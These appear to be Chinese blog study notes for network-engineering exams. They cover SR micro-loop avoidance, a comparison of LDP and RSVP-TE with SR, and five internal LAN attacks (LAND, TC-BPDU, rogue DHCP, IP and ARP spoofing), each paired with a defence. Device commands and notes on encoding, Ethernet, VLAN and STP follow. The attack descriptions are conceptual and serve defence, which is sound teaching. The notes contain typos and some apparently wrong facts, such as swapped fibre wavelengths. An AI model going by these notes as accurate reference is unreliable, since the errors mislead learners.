超时，这时网络中其他节点都己经完成收敛，源节点也正常收敛，退出TI-LFA 流程，按照正常收敛后的路径转发报文。<span class="hljs-comment"># （2）本地回切防微环</span>微环不但可能在路径正切时产生，也可能在放障恢复后路径回切时出现。下面介绍回切时产生环路：主链路发生故障之后，报文按照重新收敛之后的备份路径发送到目的节点。主链路故障恢复后，假设备份节点率先完成收敛。源节点收到报文，由于源节点未完成收敛，依然按照故障恢复前路径转发，转发给备份节点。备份节点已经完成收敛，所以备份节点按照故障恢复后的路径转发到源节点，这样就在源节点和备份节点之间形成了环路。解决方式：在备份节点部署回切防微环，部署回切防微环后的收敛流程如下：主链路故障后恢复，备份节点率先完成收敛。备份节点启动定时器T1，在T1超时前，备份节点针对访问目的节点的报文计算出防微环Segment List。源节点收到报文，由于源节点未完成收敛，依然按照故障恢复前路径转发，转发给备份节点。备份节点在报文中插入防微环Segment List，并转发到源节点。源节点根据Node SID 和Adjacency SID 指令执行转发动作，沿着Adjacency SID 指定的出接口转发出去，最终转发至目的节点。<span class="hljs-comment"># （3）远端防微环</span>前面介绍了本地正切防微环，实际上正切时不仅会导致本地微环，也可能引起远端节点之间形成环路，即沿着报文转发路径，如果离放障点更近的节点先于离放障点远的节点收敛，就可能会导致环路。下面描述远端微环产生过程：计算节点的非直连链路或节点故障，假设计算节点率先完成收敛，备份节点未完成收敛。备份节点沿着故障前路径将报文转发到计算节点，由于计算节点己经完成收敛，根据路由下一跳转发到备份节点。这样报文就在备份节点和计算节点之间闻形成了环路。解决方式：在计算节点使能远端防微环，使能远端防微环后的收敛流程如下：计算节点的非直连链路或节点故障，假设计算节点率先完成收敛。计算节点启动定时器T1，在T1 超时前，计算节点针对访问目的节点的报文计算出防微环Segment List。备份节点收到报文，由于备份节点末完成收敛，依然按照故障发生之前的路径将报文转发给计算节点。计算节点在报文中插入防微环Segment List，并转发到备份节点。备份节点根据Node SID 的指令执行转发动作，将报文转发给最远P 节点。最远P 节点根据Adjacency SID 的指令执行转发动作，沿着Adjacency SID 出接口转发出去，最后转发到目的节点。</code></pre><h3 id="5、LDP、RSVP-TE-跟SR-比较"><a href="#5、LDP、RSVP-TE-跟SR-比较" class="headerlink" title="5、LDP、RSVP-TE 跟SR 比较"></a>5、LDP、RSVP-TE 跟SR 比较</h3><blockquote><p>问题4：LDP、RSVP-TE 跟SR 比，不好在哪里。(MPLS LDP 和RSVP-TE 与SR 相比较有不足之处，那么部署MPLS LDP 和RSVP-TE 有什么问题?)</p></blockquote><pre><code class="hljs bash">答:MPLS LDP 和SR 相比MPLS LDP 建立LSP 需要同时使用IGP 和LDP 协议，IGP 用来通告路由和拓扑信息，形成路由表。LDP 用来分发标签，形成标签转发表。LDP 的LSP 需要依赖IGP 生成的路由表才能形成LSP。MPLS LDP 的两个主要缺点:    (1)存在IGP 和LDP 同步的问题，某些场景，IGP 如果先收敛，LDP 后收敛会导致数据传递的路由黑洞问题。    (2)LDP 不支持计算路径。SR 的路由信息的通告和计算全部使用IGP 协议单独完成，OSPF 通过LSA10 中的type7 来携带PrefixSID，ISIS 通过TLV235携带PrefixSID，那么就不存在MPLS LDP 中的IGP 和LDP 问题。    (3)LDP 是为每条路由分配标签，而SR 只为节点和IGP 的邻居分配标签，在标签空间的使用上，SR 比LDP 少很多，SR 更适合大规模组网。RSVP-TE 和SR 相比    (1)控制平面:SR 信令控制也是IGP 的扩展，无需专门的MPLS 的控制协议，减少了协议的数量，而RSVP- TE 需要RSVP 作为控制协议，控制平面比较复杂。    (2)可扩展性:SR 是源路由技术，通过控制器可以计算路径，隧道的信息有标签栈进行携带，也就是状态在数据包中。而RSVPTE 每台设备都需要维护隧道的状态信息，可扩展性差。    (3)负载分担能力:RSVP 的隧道不支持负载分担，如果需要做负载必须创建多个隧道，而SR 的隧道很容易支持负载分担。</code></pre><h3 id="6、外网攻击场景"><a href="#6、外网攻击场景" class="headerlink" title="6、外网攻击场景"></a>6、外网攻击场景</h3><blockquote><p>论述题1.5 来自外网的流量攻击 DDos攻击等，可以通过FW进行防御。来自于内网的流量，会有哪些？举出5种内网攻击场景，并提供解决方案。（1个场景1分，5个场景以上满分）</p></blockquote><p>答：DDos攻击是指攻击者通过控制大量的僵尸主机，向被攻击目标发送大量精心构造的攻击报文，造成被攻击者所在网络的链路拥塞、系统资源耗尽，从而使被攻击者产生拒绝向正常用户的请求提供服务的效果。来自外网流量的DDos攻击等，可以使用防火墙进行防御，而来自内部的流量也往往存在很多攻击行为，以下是关于内网流量攻击以及相应的解决方案：</p><ol><li>LAND 攻击<br>LAND攻击是攻击者利用 TCP 连接三次握手机制中的缺陷，向目标主机发送一个源地址和目的地址均为目标主机、源端口和目的端口相同的 SYN 报文，目标主机接受到该报文后，将创建一个源地址和目的地址均为自己的 TCP 空连接，直至连接超时。在这种攻击方式下，目标主机将会创建大量无用的 TCP 空连接，耗费大量资源，直至设备瘫痪。攻击者利用这个攻击原理攻击重要节点的网络设备，例如服务器的网关设备，这样会导致设备资源使用率过高，影响网络服务。</li></ol><p>解决方式：</p><p>可以在网关设备上启用畸形报文攻击防范，启用该防范后，设备采用监测 TCP SYN 报文的源地址和目的地址的方式来避免LAND攻击。如果 TCP SYN 报文中的源地址和目的地址一致，则认为是畸形攻击，丢弃该报文。</p><ol start="2"><li>TC-BPDU攻击</li></ol><p>交换设备在接受到TC BPDU 报文后，会执行 MAC 地址表项和 ARP 表项的删除操作。攻击者利用该原理伪造TC BPDU 报文而已攻击交换设备，短时间内产生大量的 TC BPDU 报文，<br>导致交换设备会收到很多 TC BPDU 报文，频繁的删除操作会给设备造成很大的负担，导致设备资源使用率过高，影响网络质量，也给网络的稳定带来很大隐患。</p><p>解决方式：</p><p>在交换设备上启用防 TC-BPDU 报文攻击，启用该功能后，在单位时间内，交换设备处理 TC BPDU 报文的次数可配置。如果在单位时间内，交换设备在收到 TC BPDU 报文数量大于配置的阈值，那么设备只会处理阈值指定的次数。对于其他超出阈值的 TC BPDU 报文，定时器到期后设备只对其统一处理一次。这样可以避免频繁的删 MAC 地址表象和 ARP 表项，从而达到保护设备的目的。</p><ol start="3"><li>DHCP Server 仿冒攻击</li></ol><p>由于 DHCP Server 和 DHCP Client 之间没有认知机制，所以如果在网络上随意添加一台 DHCP 服务器，他就可以为客户端分配 IP 地址以及其他网络参数。如果该 DHCP 服务器为用户分配错误的 IP 地址和其他的网络参数，导致用户上网异常等现象。</p><p>解决方案：</p><p>为了防止 DHCP Server 放冒者攻击，可配置设备接口的“信任(Trusted)&#x2F;非信任(Untrusted)”工作模式，启用后接口默认为非信任模式，将与合法 DHCP 服务器直接或间接的连接的接口设置为信任接口。此后，从“非信任(Untrusted)”接口上收到的 DHCP 回应报文将被直接丢弃，这样可以有效防止 DHCP Server 放冒者的攻击。</p><ol start="4"><li>IP 欺骗攻击</li></ol><p>随着网络规模越来越大，通过伪造源 IP 地址实施的网络攻击（简称 IP 地址欺骗攻击）也逐渐增多。攻击者通过伪造合法用户的 IP 地址获取网络访问权限，非法访问网络，甚至造成合法用户无法访问网络，或者信息渗漏。</p><p>解决方案：</p><p>可以在接入设备上启用 IPSG，IPSG 利用绑定表（源 IP 地址、源 MAC 地址、所属 VLAN、入接口的绑定关系）去匹配检查二层接口上收到的IP报文，只有匹配绑定表的报文才允许通过，其他报文将被丢弃。绑定表包括静态和动态两种。静态绑定表使用 user-bind 命令手动配置。 DHCP Snooping 动态绑定表在配置 DHCP Snooping 功能后， DHCP 主机动态获取IP地址时，设备根据 DHCP 服务器发送的 DHCP 回复报文动态生成。配置 IPSG 技术结合 DHCP Snooping 功能进行抵御。可以在交换机上接口或者 VLAN 上配置 IPSG 功能，对入方向的IP报文进行绑定表匹配检查，当设备在转发IP报文时，将此IP报文中的源IP、源MAC、端口、VLAN信息和绑定表的信息进行比较， 如果信息匹配，说明是合法用户，则允许此用户正常转发，否则认为是攻击者，丢弃该用户发送的IP报文。从而避免了IP欺骗报文。</p><ol start="5"><li>ARP欺骗攻击</li></ol><p>ARP欺骗是针对ARP的一种攻击技术，通过使用错误的ARP 载荷信息欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网关不通。此种攻击可让攻击者获取局域网上的数据包甚至可以篡改数据包，且可让网络上特定计算机或所有计算机无法正常连通。</p><p>解决方案：</p><p>为了防御 ARP 欺骗攻击，可以在 Switch 上部署动态 ARP 监测 DAI(Dynamic ARP Inspection)功能。动态ARP监测是利用DHCP snooping绑定表来防御中间人攻击的。当设备收到ARP报文时，将此ARP报文对应的源IP、源MAC、VLAN以及接口信息和绑定表的信息进行比较，如果信息匹配，说明发送该ARP报文的用户是合法用户，允许此用户的ARP报文通过，否则就认为是攻击，丢弃该ARP报文。</p><h3 id="7、CloudCampus-解决方案的业务随行多认证点"><a href="#7、CloudCampus-解决方案的业务随行多认证点" class="headerlink" title="7、CloudCampus 解决方案的业务随行多认证点"></a>7、CloudCampus 解决方案的业务随行多认证点</h3><blockquote><p>论述题2.5 解释 CloudCampus 解决方案的业务随行原理，如果有两个认证点（同时也是策略执行点），用户分散在两个认证点，采用什么方案实现全网业务随行。给出两个方案。</p></blockquote><p>答：业务随行的原理如下：</p><p>传统园区网络主要通过 ACL 对用户的策略进行控制。基于 ACL 的策略配置依赖组网、IP和VLAN 的规划，网络的拓扑改变、VLAN规划改变、IP地址改变以及用户的位置变化都会导致ACL规则的变更，因此用户策略的配置无法与物理网络解耦，缺乏灵活性，可维护性差。</p><p>为了解决这个问题，使得用户不管身处何处、使用哪个IP地址，都可以保证该用户在园区网络中忽的一致性的访问策略</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="常用命令与技巧"><a href="#常用命令与技巧" class="headerlink" title="常用命令与技巧"></a>常用命令与技巧</h3><ol><li>检查命令</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># 保持ssh会话</span>sysuser-interface console 0idle-timeout 0 0<span class="hljs-comment"># 关闭日志</span>undo info-center <span class="hljs-built_in">enable</span><span class="hljs-comment"># lldp</span>system-viewlldp <span class="hljs-built_in">enable</span>display lldp neighbor brief<span class="hljs-comment"># 查看 IP 地址池</span>display current-configuration configuration ip-pool<span class="hljs-comment"># </span>display ip interface brief<span class="hljs-comment">#</span>display port vlan<span class="hljs-comment">#</span>dis lldp neighbor brief<span class="hljs-comment"># </span>dis cur | include prefix&gt; <span class="hljs-comment"># 清除配置，重启生效</span>reset saved-configuration<span class="hljs-comment"># 查看VPN实例</span>dis cur config vpn-instance</code></pre><ol start="2"><li>快捷键</li></ol><pre><code class="hljs bash">CTRL+X 删除光标左侧所有的字符CTRL+Y 删除光标所在位置及其右侧所有的字符CTRL+E 将光标移动到当前行的末尾CTRL+A 将光标移动到当前行的第一个字符CTRL+W 删除光标左侧的一个字<span class="hljs-comment"># 组合键</span>ESC+B 将光标向左移动一个字符串ESC+D 删除光标右侧的一个字符串<span class="hljs-comment"># 不常用</span>ESC+F 将光标向右移动一个字符串CTRL+B 将光标向左移动一个字符CTRL+F 将光标向右移动一个字符CTRL+D 删除当前光标所在位置的字符CTRL+H 删除光标左侧的一个字符CTRL+N 显示历史命令缓冲区中的后一条命令CTRL+P 显示历史命令缓冲区中的前一条命令</code></pre><h2 id="排查命令"><a href="#排查命令" class="headerlink" title="排查命令"></a>排查命令</h2><pre><code class="hljs bash">display  ospf 65001 errordis cu configuration  ospf  65001</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络工程师</title>
      <link href="/2024/04/16/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88/"/>
      <url>/2024/04/16/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88/</url>
      
        <content type="html"><![CDATA[<h1 id="网络工程师"><a href="#网络工程师" class="headerlink" title="网络工程师"></a>网络工程师</h1><h2 id="考试大纲"><a href="#考试大纲" class="headerlink" title="考试大纲"></a>考试大纲</h2><p>工作要求：了解产品线+解决问题</p><h2 id="综合知识"><a href="#综合知识" class="headerlink" title="综合知识"></a>综合知识</h2><h3 id="计算机硬件基础-（3-4）"><a href="#计算机硬件基础-（3-4）" class="headerlink" title="计算机硬件基础 （3~4）"></a>计算机硬件基础 （3~4）</h3><blockquote><p>例如：数据的表示、指令系统、流水线、CPU、Cache、内存编址、存储设备、可靠性</p></blockquote><h3 id="操作系统基础-（1～2）"><a href="#操作系统基础-（1～2）" class="headerlink" title="操作系统基础 （1～2）"></a>操作系统基础 （1～2）</h3><blockquote><p>例如：操作系统概念、进程管理、存储管理、文件管理、设备管理</p></blockquote><h3 id="系统开发与项目管理基础-（3～4）"><a href="#系统开发与项目管理基础-（3～4）" class="headerlink" title="系统开发与项目管理基础 （3～4）"></a>系统开发与项目管理基础 （3～4）</h3><blockquote><p>例如：软件生命周期、软件开发模型、开发概念、项目管理</p></blockquote><h3 id="知识产权和标准化-1"><a href="#知识产权和标准化-1" class="headerlink" title="知识产权和标准化 1"></a>知识产权和标准化 1</h3><blockquote><p>例如：著作权、保护期限、产权人确立、侵权判断、商标权，专利权、网络安全法、信息安全法</p></blockquote><h3 id="网络体系结构-2"><a href="#网络体系结构-2" class="headerlink" title="网络体系结构 2"></a>网络体系结构 2</h3><blockquote><p>例如：网络协议、网络性能参数、OSI参考模型、TCP&#x2F;IP体系结构</p></blockquote><h3 id="数据通信基础-（4～6）"><a href="#数据通信基础-（4～6）" class="headerlink" title="数据通信基础 （4～6）"></a>数据通信基础 （4～6）</h3><blockquote><p>例如：信道传输速率、调制与编码、常见复用技术和相关标准、差错控制编码</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523150533613.png" alt="香农定理"></p><p>香农定理</p><pre><code class="hljs bash">QPSK 是四相位调制技术，N=4；DPSK 中 N=2；QPSK 中 N=4；8PSK 中 N=8；BPSK 中N=2 4 幅度 8 相位调制最大可以组成 32 种码元     无线电波:500kHz-1000Mhz，是能量最小、波长最高、频率最低的电磁波。用于广播电视和无线通信。     微波:300MHz-300GHz 是一种波长较低、频率较高的电磁波，特点是高频高能量。用于雷达、飞机导航。 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523150744426.png" alt="img"></p><pre><code class="hljs bash">频分多路复用典型应用：无线电广播、ADSL、FDD-LTE 时分多路复用典型应用：T1/E1、SONET/SDOH、WIFI、TDD-LTE波分复用:本质也是频分复用 光纤频率与波长关系:光速 c=波长 x 频率美国和日本使用 T1 标准，每路电话 64k，T1=64k*24+开销与间隔=1.544M T3=28T1 我国和欧洲采用 E1 标准，每路电话 64k，传 30 路电话 2 路开销（CH0 和 CH16 用于控制）                                E1=64*30+64K*2=2.048M E3=4*E2 E2=4*E1信道带宽 W    模拟信道:W=f2-fi(f 和 f 分别表示:信道能通过的最高/最低频率，单位赫兹 Hz)。    数字信道:数字信道是离散信道，带宽为信道能够达到的最大数据传输速率，单位是 bit/s码元:一个数字脉冲称为一个码元(可理解为时钟周期的信号)。     码元速率:单位时间内信道传送的码元个数。如果码元宽度(脉冲周期)为 T，则     码元速率(波特率)为 B=1/T，单位是波特 Baud。     一个码元携带信息量 n(位)与码元种类数(N)的关系 n=1ogzN。奈奎斯特定理:在一个理想的(没有噪声环境)信道中，若信道带宽为 W，最大码元速率为:B=2W(Baud)。    极限数据速率为 R=Blog2N=2Wlog2N。(N 表示码元种类数)     码元速率 =每秒发送包裹个数 数据速率 = 每秒发送包裹重量     每秒包裹重量=每秒发送包裹个数 x 每个包裹重量     数据速率 =码元速率 x 每个码元携带信息量 香农定理:在一个噪声信道的极限数据速率和带宽之间的关系。     极限速率公式为:C=Wlog2(1+S/N) 分贝与信噪比关系:dB=10log10S/N     其中 W 为带宽，S 为信号平均功率， N 为噪声平均功率，S/N 为信噪比。     ·dB=30=10log10S/N，则 S/N=1000（约等于 2 的 10 次方）<span class="hljs-comment"># 单模光纤: </span>    当光纤的几何尺寸可以于光波长相比拟时，即纤芯的几何尺寸与光信号波长相差不大时，一般为5~10um。波长810或1300nm。    光纤只允许一种模式在其中传播，单播光纤具有极宽的带宽，特别适用于大容量、长距离的光纤通信。（贵）<span class="hljs-comment"># 多模光纤：</span>    多模光纤纤芯的几何尺寸远大于光波波长，一般为50um、62.5um；允许多种模式光信号传播。波长1310或1550nm    多模光纤仅用于较小容量、短距离（最长550m）的光纤传输通信。（便宜）    单模光纤在芯线中以一种全反射路径传播，多模是多种反射路径<span class="hljs-comment"># 曼彻斯特编码</span>    是一种双相码，在每个比特中间均有一个跳变，第一个编码自定义，由高电平向低电平跳变代表“0”，由低电平向高电平跳变代表“1”。 <span class="hljs-comment"># 差分曼彻斯特编码</span>    也是一种双相码，用在王令牌环网中。有跳变代表“0”，无跳变代表“1”，不是比较形状，比较起始电平(上一个的终止与下一个起点)。【有 0 无 1】<span class="hljs-comment"># 共同点：</span>    编码效率低都是 50%；两种曼码数据速率是码元速率的一半    4B/5B 效率 80%，用于百兆以太网 8B/10B 效率 80%，用于千兆以太网    64B/66B 效率 97%，用于万兆以太网数字数据不仅可以用脉冲传输，也可以用模拟信号传输。 用数字数据调制模拟信号叫作数字调制。反之是解调。 幅度键控(ASK):用载波的两个不同振幅表示 0 和 1。高低不同 频移键控(FSK):用载波的两个不同频率表表示 0 和 1。快慢不同 相移键控(PSK):用载波的起始相位的变化化表示 0 和 1。相位不同 正交幅度调制(QAM):把两个幅度相同但相位差 90°的模拟信号合成一个模拟信号。 <span class="hljs-comment"># PCM 编码数字化过程 3 个步骤：采样、量化和编码。PCM 属于基带传输。</span>(1)采样:按照一定的时间间隔对模拟信号号进行取样，把模拟信号的当前值作为样本。 奈奎斯特采样定理：如果模拟信号的最高频率为 fmax，若以大于等于 2fmax 的采样频率对其进行采样，则采样得到的离散信号序列就能完整地恢复出原始信号 (2)量化:把取样后得到的样本田连续值转换为离散值，离散值的个数决定了量化的精度。 (3)编码:把量化后的样本值变成相应的二进制代码。 海明不等式：校验码个数为 k，可以表示 2k个信息，1 个信息息用来表示“没有错误”其余 2^k-1 个表示数据中存在错误，如果满足 2^k-1≥m+k(m 为信息位，m+k 为编码后的数总长度)，在理论上 k 个校验码就可以判断是哪一位出现了问题。<span class="hljs-comment"># 海明码用于纠错，CRC 校验只能用于检错</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523154237058.png" alt="CRC循环冗余校验码（Cyclic Redundancy Check）"></p><p>CRC循环冗余校验码（Cyclic Redundancy Check）</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523153114088.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 帧中继 FR(Frame Rlay) </span>· 帧中继在第二层建立虚电路，提供虚电路服务，本地标识 DLCI。 · 基于分组交换的透明传输，可提供面向连接的服务。 · 只做检错和拥塞控制，没有流控和重传机制，开销很少。 · 既可以按需要提供带宽，也可以应对突发的数据传输。 · CIR 承诺速率 EIR:扩展速率 · 帧长可变，长度可达 1600-4096 字节，可以承载各种局域网的数据帧。 · 可以达到很高的速率，2-45Mbps。 · 不适合对延迟敏感的应用(语音、视频)。 · 数据的丢失依赖于运营商对虚电路的配置。 · 不保障可靠的提交。<span class="hljs-comment"># ISDN 和 ATM</span>ISDN 综合数字业务双三的是以数字系统代替模拟自话系统，把音频、视频、数据业务放在一个网上统一传输。 · 分为窄带 ISDN 和宽带 ISDN，窄带 ISDN 提供两种用户接口。 · 基本速率 BRI=2B+D=144kbps。 · 基群速率 PRI=30B+D=2.048M。 · ATM 是信元交换，信元为 53 字节固定长度。 · ATM 依然是以虚链路提供面向连接的服务。 · ATM 典型速率为 150M。 <span class="hljs-comment"># HDLC (High Levee Data Link Control，高级数据链路控制) </span>· HDLC 是一种面向位(比特)的同步链路控制协议。 · 通常使用 CRC-16、CRC-32 校验，帧边界“01111110”。 · 信息帧(I 帧):第一位立为 0，用于承载数据和控制。 · N(S)表示发送帧序号，N(R)表示下一个预期要接收帧的序号，N(R)=5，表示示下-帧要接收5 号帧。N(S)和 N(R)均为 3 位二进制编码，可取值 0~7。 · 监控帧(S 帧):前两位为 10，监控帧用于差错控制和流量控制。 · S 帧控制字段的第三、匹位为 S 帧类型编码，共有四种不下同编码，含义如下表所示。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523160653955.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># CSMA/CD 以及三种监听算法</span>对总线型、星型和树型拓扑访问控制协议是 CSMA/CD(Carrier Sense MultipleAccess/Collision Detection，载波侦听多路访问/冲突检测)。 CSMA 基本原理:发送数据之前，先监听信道上是否有人在发送。若有，说明信道正忙，否则说明信道是空闲的，然后根据预定的策略决定：    (1)若信道空闲，是否立即发送。(2)若信道忙，是否继续监听。     ◆连续发生 16 次碰撞后，认为网络繁忙或故障，不再尝试发送。 (1)非坚持型监听算法:后退随机时间，由于随机时延后退，从而减少了冲突的概率。问题是因为后退而使信道闲置一段时间，这使信道的利用率降低，而且增加了发送时延。 (2)1-坚持型监听算法:继续监听，不等待有利于抢占信道，减少信道空闲时间。但是，多个站同时都在监听信道时必然会发生冲突。冲突概率和利用率都高(双高) (3)P_坚持型监听算法若信道空闲，以概率 P 发送，以概率(1-P)延迟一个时间单位，P 大小可调整。<span class="hljs-comment"># 冲突检测原理 </span>载波监听只能减小冲突的概率，不能完全避免冲突。当两个帧发生冲突后，若继续发送，将会浪费网络带宽。为了改进带宽利用率，发送站应采取边发边听的冲突检测方法，即: (1)发送期间同时接收，并把接收的数据与站中存储的数据进行比较。 (2)若比较结果一致，说明没有冲突，重复(1)。 (3)若比较结果不一致，说明发生了冲突，立即停止发送，并发送一个简短的干扰信号(Jamming)，使所有站都停止发送。 (4)发送 Jamming 信号后，等待一段随机长的时间，重新监听，再试着发送。 <span class="hljs-comment"># 二进制指数退避算法 二进制指数退避算法工作原理如下: </span>(1)检测到冲突后，马上停止发送数据，并等待随机时间再发送数据。 (2)等待的随机时间=T*Random01…2k-11 其中 Random 表示随机函数。其中是基本退避时间，可以看作固定值。k=min[重传次数，10]，如果重传 16 次后，还不能正常发送数据，认为网络拥塞或信道故障，不再尝试重传。根据公式，如果重传 12 次后，k=min[12，101=10，那么可能等待的时间是 T*Random[0，10231，一共有 1024 种可能。每次站点等待的时间都是随机数，故后一次退避时间不一定比前一次长。重传次数越多，退避窗口(即 Random取值)越大，从而降低冲突概率。 (3)如果连续发生 16 次碰撞后，认为网终繁忙或故障，不再尝试发送。<span class="hljs-comment"># 最小帧长计算 </span>最小帧长公式:Lmin=2Rxd/v R 为网络数据速率，d 为最大距离，v 为传播速度 不冲突条件:发送时间 ≥ 传送时间 +确认时间 L/R&gt;2xd/v，则推出最小帧长公式<span class="hljs-comment"># 以太网帧结构</span>~前面 7+1 字节用于时钟同步，不算入帧长。 ~数据 46-1500 字节，不够至少填充到 46 字节。 ~校验位 4 字节，CRC 循环冗余校验 32 位。 ～最小帧长 64 字节:6+6+2+46+4=64。 ～最大长 1518 字节:6+6+2+1500+4=1518。 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523161110508.png" alt="img"></p><pre><code class="hljs bash">TCP 报头 20~60 字节; IP 报头 20~60 字节 ARP 协议 根据 IP 地址从 arp 列表中查出接收端主机 Mac 地址，查看 arp 缓存：ARP –a RARP 协议 根据 mac 地址查出 ip 地址。 ~~免费 ARP 可以用来检测 IP 地址是否冲突VLSM 有效利用 IP 地址，减少广播风暴；CIDR 无类域间路由，减小骨干路由器表项压力</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523161224622.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523161255667.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523161319546.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523161333161.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 虚拟局域网(Virtual LocaArea NetwokVLAN) </span>根据管理功能、组织机构或应用类型对交换局域网进行分段而形成的逻辑网络。 不同 VLAN 通信必须经过三层设备:路由器、三层交换机防火墙等。 虚拟局域网工作站可以不属于同一物理网段，任何交换端口都可以分配给某个 VLAN，属于同一 VLAN 的所有端口构成一个广播域。 一个中继器和集线器是一个冲突域，一个 VLAN 为一个广播域，交换机的一个接口为一个冲突域。<span class="hljs-comment"># 交换机 VLAN 划分</span>静态划分 VLAN:基于交换机端口。 动态划分 VLAN:基于 MAC 地址、基于策略、基于网络层协议、基于网络层 IP 地址<span class="hljs-comment"># VLAN 作用 </span>(1)控制网络流量。一个 VLAN 内部的通信(包括广播通信)不会转发到其他 VLAN 中去，从而有助于控制广播风暴，减小冲突域，提是高网络带宽的利用率。 (2)提高网络的安全性。可以通过配置 VLAN 之间的路由来提供广播过滤、安全和流量控制等功能。不同 VLAN 之间的通信受到限制，是高了企业网络的安全性。 (3)灵活的网络管理。VLAN 机制使得工作组可以突破地理位置的限制而根据管理功能来划分。如果根据 MAC 地址划分 VLAN，用户可以在任何地方接入交换网络，实现移动办公。 <span class="hljs-comment"># 802.1Q 标签字段，重点掌握 PRI 和 VID。 </span>PRI(3 位):Priority 表示优先级，提供 0~7 共 8 个优先级，当有多个帧等待发送时，按优先级顺序发送数据包。 <span class="hljs-comment"># VID(12 位):即 VLAN 标示识符，最多可以表示 212=4096 个/LAN，其中 VID 0 用于识别优先级</span>VID 4095 保留未用，所以最多可配置 4094 个 VLAN。默认管理 VLAN 是 1，不能删除。 ~交换机添加和删除 VLAN 标签的过程由专用硬件自动实现，处理速度很快，不会引入太大的延迟。从用户角度看，数据源产生明的。标准的以太帧，目标接收的也是标准的以太帧，VLAN 标记对用户是透 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523161608789.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 交换机端口类型</span>Access 接口:只能能传送单个 VLAN 数据，用于连接 PC 等终端或通过配 VLANif 连接路由器。 Trunk 接口:能传送多个 VLAN 数据，一般用于交换机之间互联。 Hybrid 接口:混合接口，包含 access 和 trunk 属性。 QinQ:双层标签一般用于运营商城域网。 <span class="hljs-comment"># 二层环路——广播风暴</span>网络二层环路，虽然解决了单点故障，但是一旦出现广播数据帧，这些数据帧将被交换机不断泛洪，造成广播风暴，严重消耗设备 CPU 资源及网络带宽。 广播风暴现象:网络慢、mac 地址震荡、所有指示灯高速闪烁、CPU 使用率高、CLI 卡顿。<span class="hljs-comment"># STP 基本概念 </span>采用生成树(Spanning-tree)技术，在网络中存在二层环路时，通过逻辑阻塞(Block)特定端口，从而打破环路，并且在网络出现拓扑变更时及时收敛，保障网络冗余性。 <span class="hljs-comment"># 网桥 ID(Bridge ID) </span>桥 ID 一共 8 个字节，由 2 个字节优先级和 6 个字节的 MAC 地址构成。 桥优先级默认为 32768，可以手工修改。 MAC 地址为交换机背板 MAC。<span class="hljs-comment"># 路径开销(Path Cost)</span>路径开销是一个端口量，是 STP/RSTP 协计义用于选择链路的参考值。 端口路径开销与端口带宽成反比。 华为设备路径开销标准有:802.1d-1998，802.1t 及私有的 legacy，默认为 802.1t 标准。<span class="hljs-comment"># STP 选举操作</span>1. 确定一个根桥(Root Bridge)【选优先级和 MAC 地址最小的网桥】 2.确定其他网桥的根瑞口(Root Port)【非根桥的端口到根桥最近的端口】 3.每个段选择一个指定端口(Designated Port) 【先选指定桥，指定桥上为指定端口】 4.选出非指定端口(NonDesignated Port) 根端口:具有最低根路径的接口。 如果交换机上有多个端口拥有相同的根路径开销，则进一步比较接口上收到 BPDU 的优劣。<span class="hljs-comment"># 几种生成树协议</span>生成树协议: 802.1d STP (慢，拓扑收敛需要 30-50s) 快速生成树协议 802.1w RSTP (快，6s 内完成收敛) 多生成树协议 802.1s MSTP(实现多个 VLAN 负载均衡) <span class="hljs-comment"># 运营商城域网</span>(1)E-LAN 技术是 802.1Q 的 VLAN 帧标记，双层标记，打了两层 VLAN 标签这种技术被定义为 IEEE802.1ad，也称为 QinQ 技术。 ~~QinQ 实际是把用户 VLAN 嵌套在运营商城域以太网 VLAN 中传送。 (2)IEEE802.1ah 也称为 PBB，也叫 MAC-IN-MAC 技术。<span class="hljs-comment"># 5G 应用场景与关键技术</span>5G 关键技术包括: 超密集异构无线网络、大规模输入输出(MIMO)、毫米波通信、软件定义网络（SDN）和网络功能虚拟化(NFV) 5G 无线通信采用的载波调制技术是 F-OFDM, 兼容 LTE 4G<span class="hljs-comment"># WLAN 通信技术 </span>无线网主要使用三种通信技术:红外线、扩展频谱(扩频)和窄带微波技术。 扩展频谱通信:将信号散步到更宽的带宽上以减少发送阻塞和干扰的机会。 WLAN 扩展频谱技术:频率跳动扩频 FH (蓝牙)和直接接序列扩展频谱 DS (Wi-Fi)。 <span class="hljs-comment"># WLAN 网络分类 </span>WLAN 网络可以分为三类:基础无线网络、AdHoc 网络和分布式无线系统。 基础无线网络(Infrastructure Networking):用户通过无线接入点 AP 接入。 特殊网络(Ad HocNetworking):用于军用自组网或寝室局域网联机游戏。 分布式无线系统:通过 AC 控制大量 AP 组成的无线网络。 不重叠信道 2.4G 频段： 13 个信道，3 个不重叠信道(1、6 和 11)  5G+5.8G 频段：开放的不重叠信道有 5 个 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250523162007552.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 802.11 访问控制机制</span>802.11 标准为 MAC 